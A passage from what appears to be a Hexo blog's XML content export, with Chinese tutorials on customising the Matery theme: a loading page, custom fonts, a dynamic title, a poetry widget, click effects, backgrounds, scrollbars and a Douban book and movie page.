punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> loaded <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">const</span> loader <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"loading-container"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            loader<span class="token punctuation">.</span>className<span class="token operator">=</span><span class="token string">"fadeout"</span> <span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使用渐隐的方法淡出loading page</span>            <span class="token comment" spellcheck="true">// document.getElementById("body-wrap").style.display="flex";</span>            <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                loader<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">2500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//强制显示loading page 1s  </span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">loaded</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在主题的 layout 目录找到 layout.ejs 文件</p><p>在 </p><pre><code>&lt;body&gt; </code></pre><p>附近添加内容后如下：</p><pre class="line-numbers language-html"><code class="language-html">    <span class="token doctype">&lt;!DOCTYPE HTML></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> config.language %<span class="token punctuation">></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    &lt;%- partial('_partial/head') %>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.loadingPages.enable)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>        &lt;%- partial('_partial/loading-pages') %>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.loadingPages.enable)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>loading-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>loading-text<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>嘘~  正在从服务器偷取页面 . . . <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>loading-image<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>    &lt;%- partial('_partial/header') %>    ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后到主题配置文件（_config.yml）添加开关配置</p><pre class="line-numbers language-yml"><code class="language-yml">    loadingPages:    enable: true  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后</p><pre class="line-numbers language-bash"><code class="language-bash">    hexo clean <span class="token operator">&amp;&amp;</span> hexo g <span class="token operator">&amp;&amp;</span> hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可看到效果。</p><h2 id="添加导航页"><a href="#添加导航页" class="headerlink" title="添加导航页"></a>添加导航页</h2><p><a href="https://notes.zhangxiaocai.cn/posts/38b34c3c.html" target="_blank" rel="noopener">导航页1</a></p><p><a href="https://yafine-blog.cn/posts/e925.html" target="_blank" rel="noopener">导航页2</a></p><h2 id="更换网站字体"><a href="#更换网站字体" class="headerlink" title="更换网站字体"></a>更换网站字体</h2><h3 id="下载字体"><a href="#下载字体" class="headerlink" title="下载字体"></a>下载字体</h3><p>先去<a href="http://www.fonts.net.cn/" target="_blank" rel="noopener">字体网站</a>下载自己喜欢的字体。</p><h3 id="引入字体"><a href="#引入字体" class="headerlink" title="引入字体"></a>引入字体</h3><p>引入字体也很简单，在css 文件引入即可:</p><pre class="line-numbers language-css"><code class="language-css">    <span class="token atrule"><span class="token rule">@font-face</span></span><span class="token punctuation">{</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'hl'</span><span class="token punctuation">;</span>    <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url">url('https://cdn.jsdelivr.net/gh/small-rose/small-rose.github.io/box/font/hl.ttf')</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token atrule"><span class="token rule">@font-face</span></span><span class="token punctuation">{</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'ming'</span><span class="token punctuation">;</span>    <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url">url('https://cdn.jsdelivr.net/gh/small-rose/small-rose.github.io/box/font/GuDianMingChaoTi.otf')</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>针对元素使用:</p><pre class="line-numbers language-css"><code class="language-css">    <span class="token comment" spellcheck="true">/* 针对全局的使用 */</span>    <span class="token selector">body</span><span class="token punctuation">{</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'YaHei'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/* 针对元素的class属性里包含 mytitle 的使用 */</span>    <span class="token selector"><span class="token class">.mytitle</span> </span><span class="token punctuation">{</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'ming'</span> <span class="token important">!important</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* 针对元素的id属性等于 main-content 的使用 */</span><span class="token selector"><span class="token id">#main-content</span></span><span class="token punctuation">{</span> <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'仿宋'</span>,<span class="token string">"Segoe UI"</span>,Roboto,Oxygen-Sans,Ubuntu,Cantarell,<span class="token string">"Helvetica Neue"</span>,<span class="token string">'sans-serif'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.diyFont</span></span><span class="token punctuation">{</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'hl'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后</p><pre><code>    hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</code></pre><p>即可看到效果</p><h2 id="Matery-主题添加-ArtiTalk-说说模块"><a href="#Matery-主题添加-ArtiTalk-说说模块" class="headerlink" title="Matery 主题添加 ArtiTalk 说说模块"></a>Matery 主题添加 ArtiTalk 说说模块</h2><p>请参考我朋友的这篇<a href="https://notes.zhangxiaocai.cn/posts/7404e01a.html" target="_blank" rel="noopener">文章</a>。</p><h2 id="添加音乐页面"><a href="#添加音乐页面" class="headerlink" title="添加音乐页面"></a>添加音乐页面</h2><p>请参考我朋友的<a href="https://nekodeng.gitee.io/posts/hexo-music-aplayer.html" target="_blank" rel="noopener">文章</a></p><h2 id="添加小视频页面"><a href="#添加小视频页面" class="headerlink" title="添加小视频页面"></a>添加小视频页面</h2><p>新建md文件，打开Git bash，输入:</p><pre class="line-numbers language-bash"><code class="language-bash">hexo new page <span class="token string">"xsp"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后添加以下内容:</p><pre><code>---title: categoriesdate: 2018-09-30 17:25:30type: &quot;categories&quot;layout: &quot;categories&quot;---</code></pre><p>然后到主题下的layout文件夹下新建xsp.ejs文件，添加以下内容:</p><pre><code>&lt;%- partial(&#39;_partial/bg-cover&#39;) %&gt;        &lt;!-- 视频模块 --&gt;        &lt;div class=&quot;biye&quot;&gt;            &lt;p&gt;没有人可以让我回头，唯有铠甲勇士&lt;/p&gt;            &lt;div style=&quot;position: relative; padding: 30% 45%;&quot;&gt;                &lt;iframe style=&quot;                    position: absolute;                     width: 100%;                     height: 100%;                     left: 0; top: 0;&quot;                     src=&quot;//player.bilibili.com/player.html?aid=415502163&amp;bvid=BV16V41187CS&amp;cid=264102761&amp;page=1&amp;high_quality=1&quot;                     scrolling=&quot;no&quot;                     border=&quot;0&quot;                     frameborder=&quot;no&quot;                     framespacing=&quot;0&quot;                     allowfullscreen=&quot;true&quot;&gt;                &lt;/iframe&gt;            &lt;/div&gt;        &lt;/div&gt;&lt;/main&gt;</code></pre><p>然后你自己看放几个视频，按照复制即可。替换bilibili链接即可观看。自己想新建其他页面可参考这个教程。</p><h2 id="添加朋友圈"><a href="#添加朋友圈" class="headerlink" title="添加朋友圈"></a>添加朋友圈</h2><p>可以看我朋友的这篇[文章](<a href="https://hesifan.top/posts/21326.html" target="_blank" rel="noopener">https://hesifan.top/posts/21326.html</a></p><h2 id="Matery主题新手常见问题"><a href="#Matery主题新手常见问题" class="headerlink" title="Matery主题新手常见问题"></a>Matery主题新手常见问题</h2><p>可以看我朋友的这篇<a href="https://notes.zhangxiaocai.cn/posts/a53a9069.htm" target="_blank" rel="noopener">文章</a></p>]]></content>
      
      
      <categories>
          
          <category> hexo Matery </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo Matery </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客主题安装以及优化（二）</title>
      <link href="/2021/01/17/17/"/>
      <url>/2021/01/17/17/</url>
      
        <content type="html"><![CDATA[<h2 id="Matery主题个性化"><a href="#Matery主题个性化" class="headerlink" title="Matery主题个性化"></a>Matery主题个性化</h2><h2 id="动态标题"><a href="#动态标题" class="headerlink" title="动态标题"></a>动态标题</h2><p>打开博客主题文件夹，路径：themes/matery/layout/layout.ejs，在对应位置添加如下代码：</p><hr><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;var OriginTitile = document.title,    st;document.addEventListener(&quot;visibilitychange&quot;, function () {    document.hidden ? (document.title = &quot;写离开页面标题显示的内容&quot;, clearTimeout(st)) : (document.title =        &quot;写进入页面标题显示的内容&quot;, st = setTimeout(function () {            document.title = OriginTitile        }, 3e3))})</code></pre><p></script></p><h2 id="修改导航栏颜色以及透明效果"><a href="#修改导航栏颜色以及透明效果" class="headerlink" title="修改导航栏颜色以及透明效果"></a>修改导航栏颜色以及透明效果</h2><p>打开themes/matery/source/css/matery.css文件，大约在250行，有一个.bg-color属性，修改其属性值即可，代码如下：</p><pre class="line-numbers language-css"><code class="language-css">    <span class="token selector"><span class="token class">.bg-color</span> </span><span class="token punctuation">{</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>to right, <span class="token hexcode">#4cbf30</span> <span class="token number">0%</span>, <span class="token hexcode">#0f9d58</span> <span class="token number">100%</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //修改成自己喜欢的颜色值    <span class="token property">opacity</span><span class="token punctuation">:</span> <span class="token number">0.8</span><span class="token punctuation">;</span>  //透明效果 值范围 <span class="token number">0</span>~<span class="token number">1</span>，看情况自己修改    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加动态诗词"><a href="#添加动态诗词" class="headerlink" title="添加动态诗词"></a>添加动态诗词</h2><p>采用的是<a href="https://sdk.jinrishici.com/v2/browser/jinrishici.js" target="_blank" rel="noopener">今日诗词</a>，每次返回一句诗词，根据时间、地点、天气、事件智能推荐。官网有API文档，可以去看一下，有多种安装方式，最简单的方式就是从官网获取代码，在/themes/matery/layout/_partial/head.ejs添加下面的一行代码：</p><hr><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://sdk.jinrishici.com/v2/browser/jinrishici.js"</span> charset<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="鼠标点击文字特效"><a href="#鼠标点击文字特效" class="headerlink" title="鼠标点击文字特效"></a>鼠标点击文字特效</h2><p>实现方法，引入js文件，在主题文件下的/source/js/下新建click_show_text.js，其代码如下：</p><pre class="line-numbers language-js"><code class="language-js">    <span class="token keyword">var</span> a_idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">jQuery</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>$<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"body"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token string">"富强"</span><span class="token punctuation">,</span> <span class="token string">"民主"</span><span class="token punctuation">,</span> <span class="token string">"文明"</span><span class="token punctuation">,</span> <span class="token string">"和谐"</span><span class="token punctuation">,</span> <span class="token string">"自由"</span><span class="token punctuation">,</span> <span class="token string">"平等"</span><span class="token punctuation">,</span> <span class="token string">"公正"</span><span class="token punctuation">,</span> <span class="token string">"法治"</span><span class="token punctuation">,</span> <span class="token string">"爱国"</span><span class="token punctuation">,</span> <span class="token string">"敬业"</span><span class="token punctuation">,</span> <span class="token string">"诚信"</span><span class="token punctuation">,</span> <span class="token string">"友善"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> $i <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"&lt;span/>"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>a_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a_idx <span class="token operator">=</span> <span class="token punctuation">(</span>a_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> a<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">var</span> x <span class="token operator">=</span> e<span class="token punctuation">.</span>pageX<span class="token punctuation">,</span>            y <span class="token operator">=</span> e<span class="token punctuation">.</span>pageY<span class="token punctuation">;</span>        $i<span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token string">"z-index"</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span>            <span class="token string">"top"</span><span class="token punctuation">:</span> y <span class="token operator">-</span> <span class="token number">20</span><span class="token punctuation">,</span>            <span class="token string">"left"</span><span class="token punctuation">:</span> x<span class="token punctuation">,</span>            <span class="token string">"position"</span><span class="token punctuation">:</span> <span class="token string">"absolute"</span><span class="token punctuation">,</span>            <span class="token string">"font-weight"</span><span class="token punctuation">:</span> <span class="token string">"bold"</span><span class="token punctuation">,</span>            <span class="token string">"color"</span><span class="token punctuation">:</span> <span class="token string">"#FF0000"</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"body"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>$i<span class="token punctuation">)</span><span class="token punctuation">;</span>        $i<span class="token punctuation">.</span><span class="token function">animate</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                <span class="token string">"top"</span><span class="token punctuation">:</span> y <span class="token operator">-</span> <span class="token number">180</span><span class="token punctuation">,</span>                <span class="token string">"opacity"</span><span class="token punctuation">:</span> <span class="token number">0</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token number">3000</span><span class="token punctuation">,</span>            <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                $i<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">'delay()'</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".buryit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">removeAttr</span><span class="token punctuation">(</span><span class="token string">"onclick"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加背景壁纸"><a href="#添加背景壁纸" class="headerlink" title="添加背景壁纸"></a>添加背景壁纸</h2><p>在matery.css文件下查找body样式,修改如下：</p><pre class="line-numbers language-css"><code class="language-css">    <span class="token selector">body </span><span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">/* background-color: #eaeaea; */</span>         <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span><span class="token number">60</span>deg, <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">255</span>, <span class="token number">165</span>, <span class="token number">150</span>, <span class="token number">0.5</span><span class="token punctuation">)</span> <span class="token number">5%</span>, <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">228</span>, <span class="token number">255</span>, <span class="token number">0.35</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token number">0%</span> <span class="token number">0%</span> / cover, <span class="token url">url("https://x.png")</span>, <span class="token url">url("https://x.jpg")</span> <span class="token number">0</span>px <span class="token number">0</span>px<span class="token punctuation">;</span>         <span class="token property">background-attachment</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#7F95D1</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果不想要图片，去掉即可，比如：</p><pre class="line-numbers language-css"><code class="language-css">    <span class="token selector">body </span><span class="token punctuation">{</span>     <span class="token property">cursor</span><span class="token punctuation">:</span><span class="token url">url(/cursor.svg)</span>,auto<span class="token punctuation">;</span>     <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span><span class="token number">60</span>deg, <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">255</span>, <span class="token number">165</span>, <span class="token number">150</span>, <span class="token number">0.5</span><span class="token punctuation">)</span> <span class="token number">5%</span>, <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">228</span>, <span class="token number">255</span>, <span class="token number">0.35</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#34495e</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="修改滑动条"><a href="#修改滑动条" class="headerlink" title="修改滑动条"></a>修改滑动条</h2><p>在matery.css中添加样式即可：</p><pre class="line-numbers language-css"><code class="language-css">    <span class="token comment" spellcheck="true">/* 滚动条 */</span>     <span class="token selector"><span class="token pseudo-element">::-webkit-scrollbar-thumb</span> </span><span class="token punctuation">{</span>         <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#FF2A68</span><span class="token punctuation">;</span>         <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">-webkit-linear-gradient</span><span class="token punctuation">(</span><span class="token number">45</span>deg,<span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">255</span>,<span class="token number">255</span>,<span class="token number">255</span>,<span class="token number">.4</span><span class="token punctuation">)</span> <span class="token number">25%</span>,transparent <span class="token number">25%</span>,transparent <span class="token number">50%</span>,<span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">255</span>,<span class="token number">255</span>,<span class="token number">255</span>,<span class="token number">.4</span><span class="token punctuation">)</span> <span class="token number">50%</span>,<span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">255</span>,<span class="token number">255</span>,<span class="token number">255</span>,<span class="token number">.4</span><span class="token punctuation">)</span> <span class="token number">75%</span>,transparent <span class="token number">75%</span>,transparent<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">3</span>em<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token pseudo-element">::-webkit-scrollbar-track</span> </span><span class="token punctuation">{</span>        <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#ffcaca</span>ff<span class="token punctuation">;</span>         <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">3</span>em<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token pseudo-element">::-webkit-scrollbar</span> </span><span class="token punctuation">{</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">8</span>px<span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">15</span>px<span class="token punctuation">;</span>     <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加天气小插件"><a href="#添加天气小插件" class="headerlink" title="添加天气小插件"></a>添加天气小插件</h2><p>首先去中国天气<a href="https://cj.weather.com.cn/" target="_blank" rel="noopener">官网</a>配置自己的插件，选择自定义插件—&gt;自定义样式——&gt;生成代码，然后会生成一段代码，复制粘贴到themes/matery/layout/layout.ejs即可。</p><h2 id="关于我页面添加个人简历"><a href="#关于我页面添加个人简历" class="headerlink" title="关于我页面添加个人简历"></a>关于我页面添加个人简历</h2><p>打开theme/matery/layout/about.ejs文件，大约在13行。有一个``标签，找出其对应结尾的标签，大约在61行左右，然后在新增如下代码：</p><pre><code>    &lt;div class=&quot;card&quot;&gt;     &lt;div class=&quot;card-content&quot;&gt;         &lt;div class=&quot;card-content article-card-content&quot;&gt;             &lt;div class=&quot;title center-align&quot; data-aos=&quot;zoom-in-up&quot;&gt;                 &lt;i class=&quot;fa fa-address-book&quot;&gt;&lt;/i&gt;&amp;nbsp;&amp;nbsp;&lt;%- __(&#39;个人简历&#39;) %&gt;              &lt;/div&gt;                 &lt;div id=&quot;articleContent&quot; data-aos=&quot;fade-up&quot;&gt;                     &lt;%- page.content %&gt;                 &lt;/div&gt;           &lt;/div&gt;      &lt;/div&gt;    &lt;/div&gt;</code></pre><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p>粘贴的位置和空格要正确，这里的位置随你自己设置，你也可以把简历作为第一个card，然后/source/about/index.md下面写上你的简历了（就像写博客一样）。</p><h2 id="修改原有相册"><a href="#修改原有相册" class="headerlink" title="修改原有相册"></a>修改原有相册</h2><p>请参考我这位朋友的<a href="https://nekodeng.gitee.io/posts/waterfall-flow-photo-album.html" target="_blank" rel="noopener">教程</a></p><p>博主同款相册请参考这篇<a href="https://yafine-blog.cn/posts/3b98.html" target="_blank" rel="noopener">文章</a></p><h2 id="豆瓣书单电影页面"><a href="#豆瓣书单电影页面" class="headerlink" title="豆瓣书单电影页面"></a>豆瓣书单电影页面</h2><p>首先在博客站点目录执行下面的命令安装豆瓣插件：</p><hr><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-douban --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>紧接着在博客站点目录的配置文件_config.yml下，添加如下配置：</p><hr><pre class="line-numbers language-yml"><code class="language-yml">douban:   user: 252345665    #这个需要修改为你个人的id    builtin: false   #如果想生成豆瓣页面，这个需要设置为true  book:       title: 'This is my book title'       quote: 'This is my book quote'  movie:      title: 'This is my movie title'      quote: 'This is my movie quote'  game:      title: 'This is my game title'      quote: 'This is my game quote'  timeout: 10000<span aria-hidden="true" 